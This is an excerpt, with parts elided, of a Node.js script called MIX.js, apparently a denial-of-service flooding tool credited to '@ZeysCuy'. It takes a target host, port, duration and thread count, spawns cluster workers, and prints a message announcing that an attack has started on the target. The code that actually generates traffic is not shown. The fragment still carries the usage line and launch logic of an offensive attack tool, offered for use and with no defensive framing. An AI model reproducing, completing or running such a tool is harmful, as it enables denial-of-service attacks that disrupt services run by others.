...
if (process.argv.length <= 6) {
	console.log(`@ZeysCuy : node MIX.js [HOST] [PORT] [TIME] [THREADS]`);
	process.exit(-1);
}
...
if (cluster.isMaster) {
    ...
    console.log(` started attack on${process.argv[2]} time${process.argv[4]} on port${process.argv[3]} with threads${process.argv[5]}`);
    setTimeout(() => {
        process.exit(1);
    }, time * 1000);
